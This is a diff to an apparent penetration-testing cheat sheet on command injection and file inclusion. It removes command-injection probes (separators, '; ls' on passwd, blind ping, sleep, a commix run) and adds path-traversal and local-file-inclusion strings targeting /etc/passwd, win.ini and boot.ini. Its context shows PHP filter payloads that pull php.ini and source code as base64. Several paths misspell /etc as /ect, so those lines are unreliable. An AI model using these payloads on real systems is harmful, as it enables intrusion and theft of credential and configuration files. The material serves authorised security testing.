@@ -6,12 +6,6 @@ order: 4
 
 > **Test for Command Injection**
 
-Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
-Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
-Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
-Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
-Test Blind Sleep: | <code> http://ci.example.org/blind.php?address=127.0.0.1 && sleep 10 </code>
-Commix | <code> commix --level=3 --url="http://website/?arg=INJECT_HERE&arg2=argument" </code>
 
 > **Exploit Command Injection**
 
@@ -37,6 +31,14 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 
 **Test Strings:**
 
+Linux Test String 1 | <code> http://website/?p=file%3a%2f%2f%2fetc%2fpasswd </code>
+Linux Test String 2 | <code> /ect/passwd </code>
+Linux Test String 3 | <code> ../../../../../../../../../../../../../../ect/passwd </code>
+Windows IIS 1 | <code> ../../../winnt/system32.cmd.exe+/c+dir (not frequent) </code>
+Windows Test String 1 | <code> %WINDIR%\win.ini </code>
+Windows Test String 2 | <code> %SYSTEMDRIVE%\boot.ini //note only older versions of windows </code>
+
+
 **What to go after - Linux:**
 * /etc/passwd
 * [Linux pwnwiki](http://pwnwiki.io/#!presence/linux/blind.md)
@@ -47,6 +49,7 @@ http://victim/file?arg=$({chmod,+x,/tmp/t})
 * /use/lib/cgi-bin
 
 **Grab PHP files and Binary Data**
+
 Obtain Base64 Data | <code> http://website/?p=php://filter/convert.base64-encode/resource=/etc/php/7.0/apache2/php.ini <br> http://website/?p=php://filter/convert.base64-encode/resource=index.php </code>
 Decode base64 data | <code> curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=index" | base64 -d </code>
 
